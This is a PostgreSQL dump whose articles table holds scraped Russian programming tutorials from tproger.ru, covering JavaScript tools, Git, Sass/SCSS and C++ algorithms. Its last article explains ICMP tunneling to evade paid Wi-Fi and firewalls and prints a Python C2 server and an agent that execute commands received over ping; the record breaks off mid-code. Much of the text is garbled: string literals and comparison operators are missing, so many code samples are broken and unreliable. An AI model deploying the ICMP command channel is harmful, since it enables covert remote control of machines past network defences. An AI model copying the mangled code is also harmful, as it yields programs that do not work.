--
-- PostgreSQL database dump
--

-- Dumped from database version 10.6 (Ubuntu 10.6-1.pgdg16.04+1)
-- Dumped by pg_dump version 10.6 (Ubuntu 10.6-1.pgdg16.04+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: plpgsql; Type: EXTENSION; Schema: -; Owner: 
--

CREATE EXTENSION IF NOT EXISTS plpgsql WITH SCHEMA pg_catalog;


--
-- Name: EXTENSION plpgsql; Type: COMMENT; Schema: -; Owner: 
--

COMMENT ON EXTENSION plpgsql IS 'PL/pgSQL procedural language';


--
-- Name: uuid-ossp; Type: EXTENSION; Schema: -; Owner: 
--

CREATE EXTENSION IF NOT EXISTS "uuid-ossp" WITH SCHEMA public;


--
-- Name: EXTENSION "uuid-ossp"; Type: COMMENT; Schema: -; Owner: 
--

COMMENT ON EXTENSION "uuid-ossp" IS 'generate universally unique identifiers (UUIDs)';


SET default_tablespace = '';

SET default_with_oids = false;

--
-- Name: articles; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.articles (
    id character varying DEFAULT public.uuid_generate_v1() NOT NULL,
    title character varying(256),
    keywords character varying(256),
    content text,
    url character varying(128),
    student_id integer
);


ALTER TABLE public.articles OWNER TO postgres;

--
-- Name: students; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.students (
    id integer NOT NULL,
    name character varying(32),
    surname character varying(32),
    mygroup character varying(6)
);


ALTER TABLE public.students OWNER TO postgres;

--
-- Data for Name: articles; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.articles (id, title, keywords, content, url, student_id) FROM stdin;
e9ac5af6-32eb-11e9-9b69-28c2dd5a952f	Список инструментов разработчика JavaScript	JavaScript; Инструменты	В программной экосистеме JavaScript существует множество инструментов. В этой статье вам будут представлены наиболее удобные с точки зрения автора инструменты работы с JavaScript.Содержание статьи:Инструменты сборки и автоматизации;IDE и редакторы кода;Инструменты документирования кода;Инструменты тестирования;Инструменты отладки;Инструменты безопасности;Инструменты аналитики и оптимизации кода;Инструменты управления версиями;Инструменты управления пакетами и зависимостями.Инструменты сборки и автоматизацииWebpackЕвгений Туренко, кубанский переводчик JavaScript, Инструменты	https://tproger.ru/translations/javascript-tool-list/	107
e9db53ce-32eb-11e9-9b69-28c2dd5a952f	Подробное введение в работу с Git	Git; Инструменты	Что такое Git и зачем он мне?Git  HEAD:index.html\n Everything above the ==== is the version in master. \n =======\n Everything below the ==== is the version in the test branch. \n Никита Прияцелюк, последний центурион Git, Инструменты	https://tproger.ru/translations/beginner-git-cheatsheet/	107
e9f5e342-32eb-11e9-9b69-28c2dd5a952f	Подборка книг для начинающего веб-разработчика	CSS; HTML; JavaScript; Веб-дизайн; Веб-разработка	Мы сделали для вас подборку лучших книг для начала изучения веб-разработки. В неё вошли книги по JavaScript, Node.js, React.js, HTML, CSS, дизайну и паттернам проектирования.JavaScript: cильные стороныАвтор книги  создании навигационной системы сайта, а также украшениях в виде переходов, анимации и преобразования. После этого в книге даётся материал по вёрстке страниц с помощью CSS и разбираются специальные приёмы вёрстки, призванные упростить жизнь фронтенд-разработчику и сделать страницу красивее.HTML5 и CSS3. Разработка сайтов для любых браузеров и устройствКупить В последние годы на рынке появляется всё больше устройств с разными диагоналями и разрешением дисплея: смартфоны, планшеты, компьютеры. Под этот парк устройств создавать отдельную версию сайта, чтобы он выглядел, как задумывалось, нецелесообразно. Поэтому выходом из этой ситуации становится адаптивный дизайн сайта, который может подстроить размер и количество отображаемых элементов в зависимости от диагонали, разрешения и соотношения сторон дисплея.Книга Бена Фрэйна рассказывает о том, как создать адаптивный дизайн своего сайта с помощью CSS3 и HTML5. Вы познакомитесь с медиазапросами в контексте адаптивного дизайна, динамически изменяемой разметкой, способами создания эффектов, переходов и анимаций, форматом SVG для изображений и многими другими аспектами адаптивного дизайна.Adaptive Web Design: Crafting Rich Experiences with Progressive EnhancementЧитать Купить Аарон Густафсон в своей книге стремился донести до разработчиков философию и механизмы принципа прогрессивного улучшения (progressive enhancement). Благодаря этому подходу пользователи, заходящие на сайт, будут видеть реактивно загружающийся контент, а не пустую страницу. Помимо объяснения теории, Аарон дополнил свою книгу множеством примеров на JavaScript, HTML и CSS.В продаже доступна вторая версия книги, но первое издание автор выложил бесплатно на своём сайте.Конечно, список хороших книг по веб-разработке на этом не заканчивается. Однако вы можете посоветовать другие книги для начинающих в комментариях.Смотрите также: Базовые знания и план обучения для frontend разработчикаАлексей Грачев CSS, HTML, JavaScript, Веб-дизайн, Веб-разработка	https://tproger.ru/books/web-programming-books-for-beginners/	107
ea0de1fe-32eb-11e9-9b69-28c2dd5a952f	Почему Elasticsearch  хороший выбор для сбора и анализа данных среднего объёма	Big Data	Рассказывает Франсуа Руа, руководитель отдела разработки ГК  от смартфона и телевизора до инфраструктурного сервера.Устройства находятся в отдельных зданиях (примерно 1500 зданий, в каждом от 10 до 20 устройств), обслуживаются однотипной, но изолированной от других зданий инфраструктурой.Оценив поставленную задачу, мы поняли, что нам не нужна большая суперсистема, которую можно отнести к категории BigData и/или HighLoad. С другой стороны, любые привычные методы сохранения и обработки информации, такие как запись в текстовый файл или SQL-базу, не подходили из-за объёма и специфики данных, поскольку большая часть работы происходила с логами устройств. Сыграло свою роль и наличие дополнительной статистики, которую сообщают сервисы, запущенные на устройствах.\nТакже в нашем случае по оценке объёма входящих данных, скорости их поступления и озвученных задач аналитики не было необходимости отдельно строить OLTP- и OLAP-системы.Другими словами, система предполагает сбор статистики, к тому же она обеспечивает некоторое накопление данных и показ этой истории в удобном и интересном для менеджеров и аналитиков проекта виде. В результате мы выбрали Elasticsearch как оптимальное решение.Да и Elastic Stack в целом предназначен для решения такого класса задач.А что, собственно, собираем?Как говорилось ранее, устройства разные, а вот статистическая информация нас, как правило, интересует достаточно однотипная: температура и загрузка процессора, объём потребляемой памяти, время и режимы использования устройства, какие программы запускались, сетевой трафик, сколько задач выполнено, что в логи записано, какие ошибки зарегистрированы и прочие данные с устройства и об устройстве.Что на базе собранной информации хотят получить аналитики и менеджеры?Самый частый из встречающихся сценариев .ЗаключениеНа примере проекта городского масштаба мы рассмотрели применение Elasticsearch для работы с большими данными, оценили его преимущества и целесообразность применения для задач, где массивные решения вроде Hadoop избыточны. Big Data	https://tproger.ru/blogs/why-elasticsearch-is-a-good-choice/	107
ea2b7444-32eb-11e9-9b69-28c2dd5a952f	Развёрнутое руководство по Sass/SCSS	CSS; HTML	Современный CSS   (.scss) Sassy Cascading Style Sheets.Расширения .sass и .scss похожи, но всё-таки не одинаковы. Для фанатов командной строки приводим способ конвертации:# Конвертация из Sass в SCSS\n$ sass-convert style.sass style.css\n\n# Конвертация из SCSS в Sass\n$ sass-convert style.scss style.sassSass \n$color: #ff0000;\n$text: \n$text: \n$nothing: null;Вы можете присваивать значение по умолчанию переменным, у которых ещё нет значения, добавив метку !default если же переменная пуста, ей будет присвоено новое указанное значение.#container {\n  content: $text;\n}Переменные в Sass могут быть присвоены любому свойству.Вложенные правилаСтандартные вложенные CSS-элементы с использованием пробела:/* Вложенные правила */\n#A {\n  color: red;\n}\n#A #B {\n  color: green;\n}\n#A #B #C p {\n  color: blue;\n}Те же вложенные элементы с помощью SCSS:/* Вложенные правила */\n#A {\n  color: red;\n  #B {\n    color: green;\n    #C p {\n      color: blue;\n    }\n  }\n}Как видно, синтаксис выглядит более чистым и менее повторяющимся.Это особенно полезно при управлении перегруженными макетами. Таким образом, выравнивание, в котором вложенные свойства записаны в коде, полностью соответствует действительной структуре макета приложения.За кулисами препроцессор всё ещё компилирует его в стандартный код CSS (показано выше), чтобы он мог быть отображён в браузере. Мы лишь изменяем способ написания CSS.АмперсандВ SCSS используется директива .#p {\n  color: black;\n  a {\n    font-weight: bold;\n    :hover {\n      color: red;\n    }\n  }\n}С помощью символа }\n#p a {font-weight: bold;}\n#p a:hover {color: red;}В итоге амперсанд был компилирован в название родительского элемента a (a:hover).Миксины (они же примеси)Миксины объявляются директивой @mixin. После неё должно стоять имя миксина и, опционально, его параметры, а также блок, содержащий тело миксина. Например, можно определить миксин flexible(), который далее будет включён, например, в класс .centered-elements следующим образом:@mixin flexible () {\n    display: flex;\n    justify-content: center;\n    align-items: center;\n  }\n  \n.centered-elements {\n    @include flexible ();\n    border: 1px solid gray;\n  }Теперь каждый раз после применения класса .centered-elements к HTML-элементу, последний будет преобразован во Flexbox.Миксины могут также содержать селекторы, в том числе со свойствами. А селекторы могут содержать ссылки на родительский элемент через амперсанд (-webkit- или -moz-).Миксины позволяют создавать группы деклараций CSS, которые вам придётся использовать несколько раз на сайте. Хорошей практикой будет использование миксинов для вендорных префиксов. Пример:@mixin border-radius($radius) {        // Префиксы для:\n    -webkit-border-radius: $radius;    // Chrome и Safari\n       -moz-border-radius: $radius;    // Firefox\n        -ms-border-radius: $radius;    // Internet Explorer\n         -o-border-radius: $radius;    // Opera\n            border-radius: $radius;    // Стандартный CSS\n  }\n// Пример использования миксина border-radius после его создания\n.box { @include border-radius(10px); }Арифметические операцииКак и в реальной жизни, вы не можете работать с числами, у которых несовместимы типы данных (например, сложениерх и em).Сложение и вычитаниеp {\n    font-size: 10px + 2em;  // ОШИБКА!\n    font-size: 10px + 6px;  // 16px\n    font-size: 10px + 2;    // 12px\n}Всегда обращайте внимание на тип складываемых данных. То есть пиксели к пикселям, слоны к слонам. Таким же образом работает вычитание, но со знаком минус.Пример вычитания:div {\n    height: 12% - 2%;\n    margin: 4rem - 1;\n}УмножениеВыполняется точно так же, как в CSS, с помощьюcalc(a * b), но без calc и круглых скобок. Кроме того, можно ещё отделять знак умножения пробелами от чисел (5*6 == 5 * 6).Исключение Нельзя умножать пиксели между собой. То есть, 10px * 10px != 100px. 10px * 10 == 100px.p {\n    width: 10px * 10px;           // ОШИБКА!\n    width: 10px * 10;             // 100px\n    width: 1px * 5 + 5px;         // 10px\n    width: 5 * (5px + 5px);       // 50px\n    width: 5px + (10px / 2) * 3;  // 20px\n}ДелениеС делением дела обстоят немного сложнее, но разобраться можно, ведь в стандартном CSS косая линия (слэш) зарезервирована для использования краткой формы записи свойств. Пример ниже./* краткая форма записи свойств */\nfont: italic bold .8em/1.2 Arial, sans-serif;\n\n/* стандартная форма записи свойств */\nfont-style: italic;\nfont-weight: bold;\nfont-size: .8em;\nline-height: 1.2;\nfont-family: Arial, sans-serif;Есть три помощника, которые намекнут на возможность деления:Значение (или любая его часть) хранится в переменной или возвращается функцией.Значения заключены в круглые скобки.Значение используется как часть другого арифметического выражения.Пример:$var1: 20;\n$var2: 4;\n\np {\n    top: 16px / 24px;          // Отображается без изменений в стандартном CSS\n    top: (20px / 5px);         // Производится деление (но только при использовании скобок)\n    top: #{$var1} / #{$var2};  // Выводится как обычный CSS-код, деление не выполняется\n    top: $var1 / $var2;        // Деление выполняется\n    top: random(4) / 5;        // Деление выполняется (если использовать в паре с функцией)\n    top: 2px / 4px + 3px;      // Деление выполняется, если добавлена ещё одно арифметическое действие\n}Результат компиляции в CSS:p {\n  top: 16px / 24px;\n  top: 4;\n  top: 20 / 4;\n  top: 5;\n  top: 0.6;\n  top: 3.5px;\n}ОстатокОстаток вычисляет остаток от операции деления. Ниже рассмотрим, как создать  для HTML-списка.@mixin zebra() {\n    @for $i from 1 through 7 {\n        @if ($i % 2 == 1) {\n            .stripe-#{$i} {\n                background-color: black;\n                color: white;\n            }\n        }\n    }\n}\n* {\n  @include zebra();\n  text-align: center;\n}\nСоздание миксина zebra показано во вставке кода сверху. Директивы @for и @if описаны в секции ниже.Для создания образца надо написать несколько HTML-элементов.\n\n\n\n\n\nРезультат в браузере:Зебра успешно сгенерирована миксином zebraОператоры сравненияДиректива @if принимает выражение SassScript и использует вложенные в неё стили в случае, если выражение возвращает любое значение, кроме false или null.Ниже показано, как работают директивы @if и @else, вложенные в миксин.@mixin spacing($padding, $margin) {\n    @if ($padding  $margin) {\n        padding: $padding;\n    } @else {\n        padding: $margin;\n    }\n}\n\n.container {\n    @include spacing(10px, 20px);\n}Сравнение в действии. Миксин spacing выберет размеры padding }Логические операторыОписание логических операторовИспользование логических операторов Sass для создания кнопки, у которой будет меняться фон в зависимости от её ширины.@mixin button-color ($height, $width) {\n    @if (($height = 35px)) {\n        background-color: blue;    \n    } @else {\n        background-color: green;\n    }\n}\n\n.button {\n    @include button-color(20px, 30px)\n}СтрокиВ CSS определено 2 типа строк: с кавычками и без. Sass распознаёт и то, и другое. В итоге вы получите в CSS тот тип строк, который использовали в Sass.В некоторых случаях можно добавить строки в допустимые значения CSS без кавычек, но только если добавленная строка является завершающим элементом.p {\n    font: 50px Ari +  // Компилируется в 50px Arial\n}Пример ниже демонстрирует, как делать не надо.p {\n    font:  // ОШИБКА!\n}Можете складывать строки разных типов, если в них нет пробелов. Пример ниже не будет скомпилирован.p:after {\n    content:  // ОШИБКА!\n}Строки, содержащие пробелы, должны быть отделены кавычками. Решение проблемы:p:after {\n    content: \n}Пример сложения нескольких строк:p:after {\n    content: \n}Сложение строк и чисел:p:after {\n    content: \n}Обратите внимание  Свойство content работает только с псевдоселекторами :before и :after. Рекомендуется не использовать content в CSS-документе, а напрямую использовать его между тегами в HTML.Операторы управления потокамиВ SCSS есть функции (fucntion()) и директивы (@directive). Чуть выше мы уже рассматривали пример функции, когда изучали передачу аргументов внутри миксинов.Функции обычно заключаются в скобки, следующие сразу за её именем. А директива начинается с символа @.Подобно JavaScript, SCSS позволяет работать со стандартным набором операторов управления потоками.if()if()  это функция (и иногда основа искусственного интеллекта).Её использование выглядит довольно примитивным: оператор вернёт одно из двух обозначенных в условии значений./* Использование функции if() */\nif (true, 1px, 2px) =\nif (false, 1px, 2px) = это директива, использующаяся для разветвления на основе условия./* Использование директивы @if */\np {\n    @if 1 + 1 == 2 { border: 1px solid;  }\n    @if 7  }\n    @if null       { border: 3px double;  }\n}Результат компиляции:p { border: 1px solid; }\nНиже показано комбо-разветвление с добавлением директивы @else./* Создание переменной $type */\n$type: river;\n\n/* Окрашивание контейнеров в синий в случае, если значение для переменной $type  river */\ndiv {\n    @if $type == river {\n        color: blue;\n    }\n}\n\n/* Условные цвета для текста в теге  */\np {\n    @if $type == tree {\n        color: green;\n    } @else if $type == river {\n        color: blue;\n    } @else if $type == dirt {\n        color: brown;\n    }\n}Проверка на наличие родительского элементаАмперсанд выбирает родительский элемент, если тот существует. В ином случае вернёт null. Поэтому может использоваться совместно с директивой @if.В следующих примерах рассмотрим создание условных CSS-стилей в зависимости от наличия родительского элемента./* Проверка на наличие родительского элемента */\n@mixin does-parent-exist {\n    @if  {\n        /* Применение голубого цвета родительскому элементу, если он существует */\n        :hover {\n            color: blue;\n        }\n    } @else {\n        /* Родительский элемент отсутствует, применение голубого цвета к ссылкам */\n        a {\n            color: blue;\n        }\n    }\n}Директива @forДиректива @for выводит набор стилей заданное число раз. Для каждого повторения используется переменная-счётчик для изменения вывода.Директива @forитерируется 5 раз.@for $i from 1 through 5 {\n    .definition-#{$i} { width: 10px * $i; }\n}Результат компиляции в CSS:.definition-1 { width: 10px; }\n.definition-2 { width: 20px; }\n.definition-3 { width: 30px; }\n.definition-4 { width: 40px; }\n.definition-5 { width: 50px; }Директива @eachДиректива @each устанавливает $var в каждое из значений списка или словаря и выводит содержащиеся в ней стили, используя соответствующее значение $var.@each $animal in platypus, lion, sheep, dove {\n    .#{$animal}-icon {\n        background-image: url()\n    }\n}Результат компиляции в CSS:.platypus-icon { \n    background-image: url( \n}\n.lion-icon { \n    background-image: url( \n}\n.sheep-icon { \n    background-image: url( \n}\n.dove-icon { \n    background-image: url( \n}Директива @whileДиректива @while принимает выражение SassScript и циклично выводит вложенные в неё стили, пока выражение вычисляется как true. Она может быть использована для создания более сложных циклов, чем таких, для которых подходит @for, хотя она бывает необходима довольно редко. Например:$index: 5;\n@while $index  0 {\n    .element-#{$index} { width: 10px * $index; }\n    $index: $index - 1;\n}Результат компиляции:.element-5 { width: 50px; } \n.element-4 { width: 40px; } \n.element-3 { width: 30px; } \n.element-2 { width: 20px; } \n.element-1 { width: 10px; } Функции в Sass/SCSSИспользуя Sass/SCSS можно использовать функции так же, как и в других языках.Создадим функцию three-hundred-px(), возвращающую 300px.@function three-hundred-px() {\n    @return 300px;\n}\n\n.name {\n    width: three-hundred-px();\n    border: 1px solid gray;\n    display: block;\n    position: absolute;\n}После применения класса .nameРезультат в браузере:Функции в Sass могут возвращать любое корректное значение CSS и могут быть назначены любому свойству. Они даже могут быть рассчитаны на основе переданного аргумента.@function double($width) {\n    @return $width * 2;\n}ТригонометрияТригонометрические функции sin() и cos() часто встречаются в виде встроенных классов во многих языках, таких как JavaScript, например.Их работу стоит изучать, если нужно сократить время, затрачиваемое на разработку анимаций пользовательского интерфейса, например для создания троббера. Мы, кстати, уже говорили об этом в одной из статей. Но в данном случае это будет код, а не gif-картинка, вставленная в HTML-документ.Ниже рассмотрим пару примеров для создания интересных анимационных эффектов с помощью функции sin(), в которых количество кода сведено к минимуму. Далее можете масштабировать эти знания на создание интерактивных элементов пользовательского интерфейса (движение по кругу, волнистая анимация).Преимущество использования тригонометрии в сочетании с CSS выражается в отсутствии дополнительных HTTP-запросов, как это происходит с gif-изображениями.Можно писать тригонометрические функции на Sass. Об этом читайте далее.Написание собственных функцийВ тригонометрии многие операции основаны на функциях. Каждая функция строится на основе другой. Например, функция rad() требует использования }Написание функций на Sass/SCSS очень похоже на написание функций в других языках.Использование функции pow():@function pow ($number, $exp) {\n    $value: 1;\n    @if $exp  0 {\n        @for $i from 1 through $exp {\n            $value: $value * $number;\n        }\n    }\n    @else if $exp  0 {\n        @for $i from 1 through -$exp {\n            $value: $value / $number;\n        }\n    }\n    @return $value;\n}Использование функции rad():@function rad ($angle) {\n    $unit: unit ($angle);\n    $unitless: $angle / ($angle *0 + 1);\n    //Если значение angle (угла) указано в градусах ('deg'), нужно конвертировать его в радианы.\n    @if $unit == deg {\n        $unitless: $unitless / 180 * PI();\n    }\n    @return $unitless;\n}Для вычисления тангенса функцией tan() нужно применить функции sin() и cos().Пример:@function tan($angle) {\n    @return sin($angle) / cos($angle);\n}ЗаключениеКак видите, CSS уже достаточно эволюционировал, чтобы порой заменять JavaScript. Это упрощает работу и экономит время. Кстати, загляните в одну из наших статей, в которой описаны возможности современного CSS.Но если написание математических функций самостоятельно (да ещё и на CSS) не вдохновляет вас на работу, а старый добрый JavaScript ближе и привычнее вашему сердцу и глазу, то можете просто использовать библиотеку Anime.js, принцип работы которой подробно описан в четырёх статьях: часть 1, часть 2, часть 3, часть 4.Перевод статьи  CSS, HTML	https://tproger.ru/translations/complete-sass-guide/	107
ea478134-32eb-11e9-9b69-28c2dd5a952f	Ключевые алгоритмические парадигмы с примерами на C++	C++; Алгоритмы	Цель этой статьи \n#include \n#include \n\nusing namespace std;\n\n// row[8]: номер строки для каждого ферзя\n// TC: счётчик TraceBack\n// (a, b): расположение первого ферзя от (r=a, c=b)\nint row[8], TC, a, b, line_counter;\n\nbool place(int r, int c)\n{  \n   // Проверяем ранее размещённых ферзей\n   for (int prev = 0; prev  prev++)\n   {\n       // Проверяем, совпадают ли строки или диагонали\n       if (row[prev] == r || (abs(row[prev] - r) == abs(prev - c)))\n           return false;\n   }\n   return true;\n}\n\nvoid backtrack(int c)\n{\n   // Возможное решение; первый ферзь имеет координаты a и b\n   if (c == 8  row[b] == a)\n   {\n       printf(\n       for (int j = 1; j \n       printf(\n   }\n   // Пробуем все возможные строки\n   for (int r = 0; r  r++)\n   {\n       if (place(r, c))\n       {\n           row[c] = r; // место ферзя в этом столбце и в этой строке\n           backtrack(c + 1); // следующий столбец и рекурсия\n       }\n   }\n}\n\nint main()\n{\n    scanf(\n    while (TC--)\n    {\n       scanf(\n       a--; b--; // индексируем с нуля\n\n       memset(row, 0, sizeof(row));\n       line_counter = 0;\n       printf(\n       printf(\n       backtrack(0); // генерируем все 8! возможных решений\n       if (TC) printf(\n    }\n    return 0;\n}Для TC = 8 и начальной позиции ферзя в (a, b) = (1, 1), приведённый выше код выводит следующее:РЕШ        СТОЛБЕЦ\n#    1 2 3 4 5 6 7 8\n1    1 5 8 6 3 7 2 4\n2    1 6 8 3 7 4 2 5\n3    1 7 4 6 8 2 5 3\n4    1 7 5 8 2 4 6 3Он указывает, что всего возможно 4 расстановки, принимающих начальное положение ферзя в (r = 1, c = 1).Использование рекурсии позволяет легче выделить пространство поиска в сравнении с итерационным решением.Жадный алгоритмДанный алгоритм на каждом шаге делает локально оптимальный выбор, надеясь в итоге получить глобально оптимальное решение.Пример: Дробный РюкзакЗадача состоит в том, чтобы выбрать, какие предметы, имеющие вес и стоимость, поместить в рюкзак ограниченной ёмкости W, да так, чтобы максимизировать общую ценность его содержимого. Мы можем определить соотношение стоимости предмета к его весу, т. е. с \n#include \n\nusing namespace std;\n\nstruct Item {\n   int value, weight;\n   Item(int value, int weight) : value(value), weight(weight) { }\n};\n\nbool cmp(struct Item a, struct Item b) {\n   double r1 = (double) a.value / a.weight;\n   double r2 = (double) b.value / b.weight;\n   return r1 \n}\n\ndouble fractional_knapsack(int W, struct Item arr[], int n)\n{\n   sort(arr, arr + n, cmp);\n   int cur_weight = 0; double tot_value = 0.0;\n   for (int i = 0; i  ++i)\n   {\n       if (cur_weight + arr[i].weight = W)\n       {\n           cur_weight += arr[i].weight;\n           tot_value += arr[i].value;\n       }  \n       else\n       {   // Добавляем часть следующего предмета\n           int rem_weight = W - cur_weight;\n           tot_value += arr[i].value *\n                       ((double) rem_weight / arr[i].weight);                    \n           break;\n       }\n   }\n   return tot_value;\n}\nint main()\n{\n   int W = 50; // вместительность рюкзака\n   Item arr[] = {{60, 10}, {100, 20}, {120, 30}}; // {стоимость, вес}\n   int n = sizeof(arr) / sizeof(arr[0]);\n   cout \n   cout \n   cout \n   return 0;\n}\nПоскольку сортировка  и итоговую вместительность рюкзака W = 50, приведённый выше код выводит следующее:жадный дробный рюкзак\nмаксимальная ценность: 240Мы можем заметить, что ввод предметов отсортирован с уменьшающим коэффициентом стоимость/вес. Выбрав два целых предмета 1 и 2, мы берём ⅔ от третьего предмета.\nИтоговая ценность = 60 + 100 + (2/3) * 120 = 240.Читайте также: Оценка сложности алгоритмов, или Что такое О(log n)Разделяй и ВластвуйРазделяй и Властвуй \n#include \n#include \n\nusing namespace std;\n\nint bsearch(const vectorarr, int l, int r, int q)\n{\n   while (l = r)\n   {\n       int mid = l + (r-l)/2;\n       if (arr[mid] == q) return mid;\n      \n       if (q  }\n       else              { l = mid + 1; }\n   }\n   return -1; // не нашли\n}\n\nint main()\n{\n   int query = 10;\n   int arr[] = {2, 4, 6, 8, 10, 12};\n   int N = sizeof(arr) / sizeof(arr[0]);\n   vector\n  \n   // Сортируем входной массив\n   sort(v.begin(), v.end());\n   int idx;\n   idx = bsearch(v, 0, v.size(), query);\n   if (idx != -1)\n       cout    \n   else\n       cout \n   return 0;\n}\nКод выводит следующее:бинарный поиск: нашли по индексу 4Если искомый элемент не найден, но мы хотим найти ближайший элемент меньше или больше запроса, то можно использовать функции STL lower_bound() и upper_bound().Динамическое программированиеДинамическое программирование (ДП)  способность определять состояние записей в таблице и отношения или перемещения между записями.\nЗатем, определив базовые и рекурсивные случаи, можно заполнить таблицу сверху вниз или снизу вверх.В нисходящем ДП таблица будет заполнена рекурсивно, по мере необходимости, начиная сверху и спускаясь к меньшим подзадачам. В восходящем ДП таблица будет заполняться по порядку, начиная с меньших подзадач и с использованием их решений для того чтобы подниматься выше и находить решения для бо́льших задач. В обоих случаях если решение данной подзадачи уже встречалось, оно просто ищется в таблице. И это значительно снижает вычислительные затраты.Пример: Биноминальные коэффициентыМы используем пример биноминальных коэффициентов, чтобы проиллюстрировать использование нисходящего и восходящего ДП. Код ниже основан на рекурсиях для биноминальных коэффициентов с перекрывающимися подзадачами. Обозначим через C(n, k) количество выборок из n по k, тогда имеем:Базовый случай: C(n, 0) = C(n, n) = 1\nРекурсия: C(n, k) = C(n-1, k-1) + C(n-1, k)У нас есть несколько перекрывающихся подзадач. Например, для C(n = 5, k = 2) рекурсивное дерево будет следующим:\n                              C(5, 2)\n                     /                       \\\n            C(4, 1)                            C(4, 2)\n           /      \\                        /           \\\n      C(3, 0)   C(3, 1)             C(3, 1)             C(3, 2)\n                /    \\             /     \\             /     \\\n         C(2, 0)  C(2, 1)      C(2, 0) C(2, 1)    C(2, 1)  C(2, 2)\n                  /      \\              /   \\        /    \\\n             C(1, 0)  C(1, 1)    C(1, 0)  C(1, 1) C(1, 0)  C(1, 1)\nМы можем реализовать нисходящее и восходящее ДП следующим образом:#include \n#include \n\nusing namespace std;\n\n#define V 8\n\nint memo[V][V]; // таблица\n\nint min(int a, int b) { return (a  }\n\nvoid print_table(int memo[V][V])\n{\n   for (int i = 0; i  ++i)\n   {\n       for (int j = 0; j  ++j)\n       {\n           printf(       \n       }\n       printf(\n   }\n}\n\nint binomial_coeffs1(int n, int k)\n{\n   // Нисходящее ДП\n   if Нk == 0 || k == n) return 1; \n   if (memo[n][k] != -1) return memo[n][k];\n   return memo[n][k] = binomial_coeffs1(n-1, k-1) +     \n                       binomial_coeffs1(n-1, k);\n}\n\nint binomial_coeffs2(int n, int k)\n{   \n   // Восходящее ДП\n   for (int i = 0; i  ++i) \n   {       \n       for (int j = 0; j  ++j)\n       {           \n           if (j == 0 || j == i)\n           {               \n               memo[i][j] = 1;\n           } \n           else\n           {\n               memo[i][j] = memo[i-1][j-1] + memo[i-1][j];                 \n           }\n       }\n   }\n   return memo[n][k];\n} \n\nint main()\n{\n   int n = 5, k = 2;\n   printf(\n   memset(memo, -1, sizeof(memo));\n   int nCk1 = binomial_coeffs1(n, k);\n   print_table(memo);\n   printf(\n  \n   printf(\n   memset(memo, -1, sizeof(memo));\n   int nCk2 = binomial_coeffs2(n, k);\n   print_table(memo);\n   printf(\n  \n   return 0;\n}При C(n = 5, k = 2) код выше выводит следующее:Нисходящее ДП:\n-1 -1 -1 -1 -1 -1 -1 -1\n-1 -1 -1 -1 -1 -1 -1 -1\n-1  2 -1 -1 -1 -1 -1 -1\n-1  3  3 -1 -1 -1 -1 -1\n-1  4  6 -1 -1 -1 -1 -1\n-1 -1 10 -1 -1 -1 -1 -1\n-1 -1 -1 -1 -1 -1 -1 -1\n-1 -1 -1 -1 -1 -1 -1 -1\nC(n = 5, k = 2): 10\n\nВосходящее ДП:\n 1 -1 -1 -1 -1 -1 -1 -1\n 1  1 -1 -1 -1 -1 -1 -1\n 1  2  1 -1 -1 -1 -1 -1\n 1  3  3 -1 -1 -1 -1 -1\n 1  4  6 -1 -1 -1 -1 -1\n 1  5 10 -1 -1 -1 -1 -1\n-1 -1 -1 -1 -1 -1 -1 -1\n-1 -1 -1 -1 -1 -1 -1 -1\nC(n = 5, k = 2): 10\nВременная и пространственная сложность будут выражены как --std=c++11 -Wall -o test\n$ ./testЗаключениеВ статье был рассмотрены лишь базовые алгоритмы. Больше информации по алгоритмам вы всегда можете найти у нас на сайте.Перевод статьи Сергей Ринг C++, Алгоритмы	https://tproger.ru/translations/cpp-algorithms/	107
ea6411dc-32eb-11e9-9b69-28c2dd5a952f	Обход платного Wi-Fi с помощью ping и другие возможности ICMP-туннелирования	Wi-Fi; Безопасность; Сетевые протоколы	Рассказывает Нир Чако, исследователь в области информационной безопасностиНа пути исследователя информационной безопасности часто встречаются различные сложности. В их число входят ограничения доступа к сети и необходимость оставаться незамеченным. Один из способов преодоления этих сложностей  ICMP-пакет, полезная нагрузкаИнкапсуляция HTTP-пакета в полезную нагрузку часто используется для обхода платного Wi-Fi.Это возможно с помощью прокси-сервера, который ждёт ping-сообщения и отсылает их по мере необходимости (например, в форме HTTP):С помощью нужных инструментов (вроде ptunnel) инкапсулируем HTTP-пакет, который хотим отправить в Google в составе ping-пакета (внутри полезной нагрузки). Затем отправляем его по IP прокси-сервера.\nПримечание Этот IP не является адресом получателя HTTP-пакета; адресом получателя будет www.google.com.Так как роутеры в аэропорту обычно позволяют отправлять ICMP-трафик за пределы сети, роутер доставит ping-сообщение на прокси-сервер.Прокси-сервер получает ping-пакет и разбивает его на две части:заголовки ICMP;полезную нагрузку с исходным HTTP-сообщением.Примечание  IP-адрес отправителя HTTP-пакета, который прокси отправляет Google, должен быть IP-адресом самого прокси-сервера, а не вашего ноутбука или роутера аэропорта, поскольку Google должен ответить именно прокси, а не вам.Это, возможно, самое частое применение ICMP-туннеля, но мне, как пентестеру, больше интересно его использование для обхода брандмауэров и прочих сетевых политик.Всё это возможно благодаря тому, что ping-сообщения могут свободно выходить из локальной сети Wi-FiВ данном POC не рассматривается обработка фрагментации. Фрагментация может произойти, например, если ответ от агента будет больше, чем позволяет размер полезной нагрузки.POC включает в себя управляющий сервер и агент. Сервер будет посылать агенту команды через ICMP-туннель, а агент через него будет возвращать результат:C2.py#!/usr/bin/env python3\nfrom scapy.all import *\ndef main():\n    while True:\n        command = input('# Enter command: ')\n        # создаём ICMP-пакет с командой в качестве полезной нагрузки\n        pinger = IP(dst=)/ICMP(id=0x0001, seq=0x1)/command\n        send(pinger)\n        # ждём ICMP-сообщение с ответом от агента\n        rx = sniff(count=1, timeout=2)\n        # если агент не на локальной машине, используйте это: rx = sniff(filter=, count=1)\n        print(rx[0][Raw].load.decode('utf-8'))\nif __name__ == :\n    main()Agent.py#!/usr/bin/env python3\nimport os\nfrom scapy.all import *\ndef main():\n    while True:\n        # ждём от C2-сервера ICMP-сообщение с командой\n        rx = sniff(filter=, count=1)\n        # извлекаем из пакета полезную нагрузку\n        var = rx[0][Raw].load.decode('utf-8')\n        # запускаем команду и 